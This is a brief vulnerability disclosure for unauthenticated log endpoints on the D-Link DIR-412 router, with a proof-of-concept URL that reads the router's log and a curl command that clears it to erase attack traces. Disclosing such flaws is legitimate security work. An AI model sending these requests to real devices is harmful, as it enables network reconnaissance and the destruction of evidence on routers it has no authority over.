#### info of vulnerability
There are some web interfaces without authentication requirements in D-Link routers. An attacker can get the router’s log file and clear it ,which could be used to detect inside network structure and erase the attack traces.

Vulnerable targets include but are not limited to the lastest firmware versions of DIR-412(A1-1.14WW)   

Poc1: http://targetip/log_get.php
![poc1](https://github.com/dahua966/Routers-vuls/blob/master/DIR-412/poc1.png)
Poc2: curl -d "act=clear&logtype=sysact" "http://targetip/log_clear.php"
![poc2](https://github.com/dahua966/Routers-vuls/blob/master/DIR-412/poc1.png)
#### Acknowledgement
Thanks to the partners who discovered the vulnerability together：

Wei Xie

Zhen-hua Wang

En-Ze Wang